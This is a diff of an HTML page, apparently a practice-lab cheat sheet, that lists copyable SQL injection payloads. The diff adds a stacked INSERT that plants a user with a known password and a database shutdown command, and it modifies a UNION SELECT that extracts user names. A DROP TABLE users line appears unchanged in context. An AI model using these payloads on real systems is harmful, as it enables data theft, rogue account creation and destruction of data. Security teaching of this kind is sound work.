@@ -76,15 +76,19 @@
             <div class="copy">Copy</div>
           </div>
           <div class="text-code alert alert-success">
-            <div class="text">' UNION select name, description from users #</div>
+            <div class="text">' UNION select first_name, last_name from users #</div>
             <div class="copy">Copy</div>
           </div>
           <div class="text-code alert alert-success">
-            <div class="text">' UNION SELECT * FROM users #</div>
+            <div class="text">' ; INSERT INTO users(user, last_name, first_name, password) VALUE("test", "Test 1", "Test 2", "1234") #</div>
             <div class="copy">Copy</div>
           </div>
           <div class="text-code alert alert-success">
             <div class="text">' ; DROP TABLE users #</div>
+            <div class="copy">Copy</div>
+          </div>
+          <div class="text-code alert alert-success">
+            <div class="text">'; shutdown # #</div>
             <div class="copy">Copy</div>
           </div>
         </div>
